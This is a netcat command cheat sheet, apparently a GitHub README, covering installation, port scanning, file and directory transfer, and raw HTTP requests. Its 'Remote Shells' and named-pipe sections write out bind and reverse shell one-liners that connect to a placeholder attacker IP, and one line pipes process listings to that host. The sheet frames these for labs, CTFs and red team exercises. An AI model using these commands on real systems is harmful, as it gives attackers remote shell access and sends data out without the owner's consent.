# Cybersecurity-Mastery-Tools-and-Commands
Tools to Master for Cybersecurity Cheat Sheet


# 🔧 Netcat (nc) Command Reference

Netcat (often abbreviated `nc`) is a lightweight, low-level network utility used for reading, writing, and piping data across TCP/UDP connections. It’s often called the **"Swiss Army Knife"** of networking.

---

## 📦 Installation

**Debian/Ubuntu:**

```bash
sudo apt install netcat
```

**RHEL/CentOS:**

```bash
sudo yum install nc
```

---

## ⚡ Basic Usage

### 🗣️ Simple Chat (TCP connection)

**On the server (listener):**

```bash
nc -lvp 1234
```

**On the client (connector):**

```bash
nc <server_ip> 1234
```

---

## 🔍 Port Scanning

```bash
nc -zv <target_ip> 1-1000
```

* `-z`: Zero-I/O mode (scan only)
* `-v`: Verbose output

---

## 📁 File Transfer

### ⬆️ Send File:

```bash
nc <receiver_ip> 4444 < file.txt
```

### ⬇️ Receive File:

```bash
nc -lvp 4444 > received.txt
```

---

## 👩‍🔌 Remote Shells

### Bind Shell (victim listens):

```bash
nc -lvp 4444 -e /bin/bash
```

### Reverse Shell (victim connects back):

```bash
nc <attacker_ip> 4444 -e /bin/bash
```

> ⚠️ Note: Many systems disable the `-e` flag. Use alternative techniques like `mkfifo` or `socat` instead.

---

## 🔀 Send Command Output

```bash
ps aux | nc <attacker_ip> 4444
```

---

## 🎯 Practical Examples

### 🕵️ Grab a Web Page (HTTP request):

```bash
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
```

### 📃️ Transfer a directory as tar.gz:

**Sender:**

```bash
tar czf - /my/folder | nc <receiver_ip> 4444
```

**Receiver:**

```bash
nc -lvp 4444 | tar xzvf -
```

---

## 🔐 Use with Named Pipes (No `-e` Available)

**On victim:**

```bash
mkfifo backpipe
cat backpipe | /bin/bash | nc <attacker_ip> 4444 > backpipe
```

---

## ⚠️ Security Note

Netcat is extremely powerful but also potentially dangerous. Always use it ethically and legally. Insecure by design — no encryption, no authentication.

---

## 🔗 Related Tools

* `ncat` – Netcat from Nmap with SSL support
* `socat` – More complex socket tool
* `cryptcat` – Encrypted Netcat variant

---

## 📚 Resources

* [https://nmap.org/ncat/](https://nmap.org/ncat/)
* [https://gtfobins.github.io/gtfobins/nc/](https://gtfobins.github.io/gtfobins/nc/)
* [https://highon.coffee/blog/netcat-cheat-sheet/](https://highon.coffee/blog/netcat-cheat-sheet/)

---

> 🧠 Save this as a quick reference and use it responsibly in your labs, CTFs, and red team exercises.
